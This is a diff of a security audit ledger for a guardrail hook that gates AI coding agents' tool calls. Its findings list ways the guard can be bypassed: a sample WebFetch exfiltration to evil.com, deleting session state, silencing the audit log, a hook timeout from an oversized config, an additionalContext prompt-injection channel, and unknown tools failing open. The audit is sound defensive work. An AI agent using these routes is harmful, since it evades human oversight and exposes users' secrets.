@@ -226,7 +226,7 @@ in-repository symlink to an external SSH private key still denies with
 `P4.symlink-escape` and a matching audit record. Dynamically assembled targets
 remain outside the documented static boundary.
 
-### H-6 **[PARKED - ADR-0012 / operator]** WebFetch / WebSearch / Task / NotebookEdit are entirely ungated ✅
+### H-6 **[PARKED — ADR-0012 / operator]** WebFetch / WebSearch / Task / NotebookEdit are entirely ungated ✅
 ```
 WebFetch {"url":"https://evil.com/steal?d=secret"}  -> ALLOWED
 WebSearch / Task / NotebookEdit                     -> ALLOWED
@@ -271,7 +271,7 @@ account patterns as ask while retaining deny outside the repository.
 ### M-6 **[FIXED — Phase 4]** `git clean -n` dry-runs are denied
 `git clean -nxd` → DENIED. `-n`/`--dry-run` makes it read-only and is the canonical preview. Blocking safe previews is how guardrails get disabled.
 
-### M-7 **[FIXED - Phase 5, `2d0ac69`]** Trifecta: session state is deletable and racy
+### M-7 **[FIXED — Phase 5, `2d0ac69`]** Trifecta: session state is deletable and racy
 `rm ~/.local/state/guardrail/sessions/s1.json` is ALLOWED (flagless `rm` isn't gated), erasing both trifecta legs — self-neutering. Separately, `Load`/`Save` is an unlocked read-modify-write: **9 of 10 concurrent trials lost a leg**. Empty `session_id` disables the heuristic wholesale.
 
 Phase 5 moved P7 tracking into the Engine, made session transactions atomic and
@@ -295,74 +295,74 @@ Windows executable spellings such as `cat.exe`, `CAT`, and
 Commit `98b7f8f` canonicalizes command identity once for every consumer by
 normalizing separators and case and stripping a trailing `.exe`.
 
-### NF-3 **[PARKED - ADR-0012 / operator]** Plane-disabled owned hooks are not reconciled
+### NF-3 **[PARKED — ADR-0012 / operator]** Plane-disabled owned hooks are not reconciled
 `doctor` can detect an absent active hook, but a disabled hook cannot invoke its
 own repair. The external updater/re-arm half has not landed, so the detection
 half remains open under operator direction.
 
-### NF-4 **[FIXED - Phase 5, `2036668`]** Standard output device redirects Ask
+### NF-4 **[FIXED — Phase 5, `2036668`]** Standard output device redirects Ask
 Exact cleaned redirects to `/dev/null`, `/dev/stdout`, `/dev/stderr`, and
 `/dev/tty` are exempted only at the redirect seam.
 
-### NF-5 **[FIXED - Phase 5, `d552b1a`]** Unresolved state is command-wide
+### NF-5 **[FIXED — Phase 5, `d552b1a`]** Unresolved state is command-wide
 Expansion provenance is now retained per argument and redirect and joined to
 policy-bearing operand roles.
 
-### NF-5b **[FIXED - Phase 5, `09cd998`]** Literal parameter prefixes remain unresolved
+### NF-5b **[FIXED — Phase 5, `09cd998`]** Literal parameter prefixes remain unresolved
 Known one-field parameter prefixes resolve; operated, split-prone, glob-prone,
 or unknown values remain fail-closed.
 
-### NF-6 **[FIXED - Phase 5, `251bf1a`]** Claude scratch redirects Ask
+### NF-6 **[FIXED — Phase 5, `251bf1a`]** Claude scratch redirects Ask
 The general NF-8 system-temp descendant rule covers scratch paths without a
 Claude-specific payload field.
 
-### NF-7 **[FIXED - Phase 5, `2a20aaf`]** Routine local Git identity writes are denied
+### NF-7 **[FIXED — Phase 5, `2a20aaf`]** Routine local Git identity writes are denied
 Git config writes are classified by scope and key, preserving Deny for risky or
 global/system writes while allowing approved local identity keys.
 
-### NF-8 **[FIXED - Phase 5, `251bf1a`]** System temp descendants are not Base-authorized
+### NF-8 **[FIXED — Phase 5, `251bf1a`]** System temp descendants are not Base-authorized
 Strict descendants of runtime system temp roots are authorized only at the
 approved seams; roots and escapes remain protected.
 
-### NF-9 **[FIXED - Phase 5, `09cd998`]** Fully scoped temporary `find` deletion Asks
+### NF-9 **[FIXED — Phase 5, `09cd998`]** Fully scoped temporary `find` deletion Asks
 Conservative root/action parsing permits only exact scoped deletion under an
 authorized system-temp descendant.
 
-### NF-10 **[FIXED - Phase 5, `780a577`]** Native rules pre-empt NF-8/NF-9
+### NF-10 **[FIXED — Phase 5, `780a577`]** Native rules pre-empt NF-8/NF-9
 Fresh generation omits the broad patterns and owned-entry merges retire them
 from existing Claude and OpenCode settings.
 
-### NF-11 **[PARKED - ADR-0012 / operator]** Audit records omit execution location
+### NF-11 **[PARKED — ADR-0012 / operator]** Audit records omit execution location
 The additive `cwd` and `repo_root` audit fields have not landed. Session IDs do
 not identify where a subagent operation ran.
 
-### NF-12 **[PARKED - ADR-0012 / operator]** Operator-held Phase 5 follow-up
+### NF-12 **[PARKED — ADR-0012 / operator]** Operator-held Phase 5 follow-up
 ADR-0012 names NF-12 in the parked set, but no tracked brief defines an
 implementation contract. No code claims closure.
 
-### NF-13 **[FIXED - Phase 5, `8d9af6c`]** OpenCode Ask retries lack bounded approval memory
+### NF-13 **[FIXED — Phase 5, `8d9af6c`]** OpenCode Ask retries lack bounded approval memory
 OpenCode now remembers one exact approved retry for ten minutes with bounded,
 one-shot state and fail-closed transport handling.
 
-### NF-14 **[FIXED - Phase 5, `91ba961`]** Direct non-link writes before scoped `find` force an Ask
+### NF-14 **[FIXED — Phase 5, `91ba961`]** Direct non-link writes before scoped `find` force an Ask
 Statement-local filesystem facts distinguish bounded direct writes from link
 and pathname uncertainty.
 
-### NF-15 **[FIXED - Phase 5, `3dafda5`]** Antigravity Ask mapping does not force a prompt
+### NF-15 **[FIXED — Phase 5, `3dafda5`]** Antigravity Ask mapping does not force a prompt
 Antigravity pre-hook Ask Verdicts now map to `force_ask`.
 
 ### NF-16 **[NOT ASSIGNED]** Numbering gap
 No finding was assigned this identifier; it is excluded from ledger totals.
 
-### NF-17 **[FIXED - Phase 5, `dee0bb6`]** Plane-owned writable roots Ask as out-of-repository
+### NF-17 **[FIXED — Phase 5, `dee0bb6`]** Plane-owned writable roots Ask as out-of-repository
 System-temp descendants and the exact Claude memory root now use bounded,
 physical, actual-home-aware authorization.
 
-### NF-18 **[FIXED - Phase 5, `1f425d6`]** Read-only `find` is treated as bulk deletion
+### NF-18 **[FIXED — Phase 5, `1f425d6`]** Read-only `find` is treated as bulk deletion
 The action-aware parser distinguishes read-only actions and evaluates
 `-exec`/`-execdir` callbacks with retained path provenance.
 
-### NF-19 **[FIXED - Phase 5, `e1ab965`]** Bounded literal-assigned values remain unresolved
+### NF-19 **[FIXED — Phase 5, `e1ab965`]** Bounded literal-assigned values remain unresolved
 The resolver covers policy-bearing operands, executable prefixes, bounded
 literal loops, `PWD`, and `HOME`; uncertain or over-bound shapes still Ask.
 
@@ -444,7 +444,7 @@ Compounding, verified by hand: `gen-config opencode --binary /ABSOLUTE/SENTINEL/
 
 - **H-8** **[FIXED — Phase 3]** **`audit_log` overlay = silencing + arbitrary append.** `audit_log = "/dev/null"` → deny events vanished (2194 lines before and after). Any user-writable path worked, with an attacker-chosen `command` field appended — `~/.ssh/authorized_keys`, a cron dir, or corrupting `~/.claude/settings.json`. `policy.Merge` now retains the Base audit path unless the exact repository has an `audit_log` Operator config grant (`internal/policy/merge.go`).
 - **H-9** **[FIXED — Phase 3]** **Claude SessionStart `additionalContext` was an unbounded prompt-injection channel.** Raw overlay `waive` strings were joined into the highest-trust model-facing text guardrail owns, wearing guardrail's own voice — no sanitization, no cap. Measured amplification: a 2.8 MB overlay → **15.4 M characters** of injected context. `sanitizeWaiverIDs` now applies the exact id format and model-facing warnings are bounded (`internal/adapter/sanitize.go`).
-- **H-10 [PARKED - ADR-0012 / operator] Unknown tool names fail OPEN on all three planes.** `NotebookEdit` with a secret `file_path`, `WebFetch`, `Task`, a *missing* `tool_name`, opencode `patch`/`grep`/`glob`, antigravity `grep_search` — all allow. opencode `patch` is the sharpest: a real write primitive the plugin forwards and the engine allows. **Fix:** default-deny unknown tools on `pre`, or treat any payload carrying a path as a file tool regardless of name.
+- **H-10 [PARKED — ADR-0012 / operator] Unknown tool names fail OPEN on all three planes.** `NotebookEdit` with a secret `file_path`, `WebFetch`, `Task`, a *missing* `tool_name`, opencode `patch`/`grep`/`glob`, antigravity `grep_search` — all allow. opencode `patch` is the sharpest: a real write primitive the plugin forwards and the engine allows. **Fix:** default-deny unknown tools on `pre`, or treat any payload carrying a path as a file tool regardless of name.
 - **H-11** **[FIXED — Phase 3]** **No overlay size limit → hook timeout → guard skipped.** A 62.9 MB `guardrail.toml` took 10.06 s, exceeding the registered `"timeout": 10`. A cancelled PreToolUse hook **does not block the call**. `LoadOverlay` now rejects input over 1 MiB before TOML parsing and bounds the read (`internal/policy/config.go`).
 
 ## MEDIUM (pass 4)
